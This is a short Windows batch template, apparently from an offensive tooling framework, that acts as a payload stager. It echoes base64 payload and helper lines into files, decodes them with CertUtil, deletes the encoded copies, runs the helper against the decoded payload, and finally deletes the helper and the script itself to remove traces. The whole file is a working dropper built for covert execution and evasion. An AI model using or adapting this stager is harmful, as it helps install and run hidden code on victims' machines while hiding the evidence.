@echo off

#for @line in @helper_payload:
ECHO @{line} >> "@{helper_file_name}.b64"
#end

#for @line in @payload:
ECHO @{line} >> "@{file_name}.b64"
#end

CertUtil -decode "@{file_name}.b64" "@{file_name}" >NUL
DEL /Q "@{file_name}.b64" >NUL 2>NUL

CertUtil -decode "@{helper_file_name}.b64" "@{helper_file_name}" >NUL
DEL /Q "@{helper_file_name}.b64" >NUL 2>NUL

@{helper_file_name} @!{executor}@{file_name}@!{additional_args}

timeout 5 >nul

DEL /Q "@{helper_file_name}" >NUL 2>NUL
DEL /Q "%~f0" >NUL 2>NUL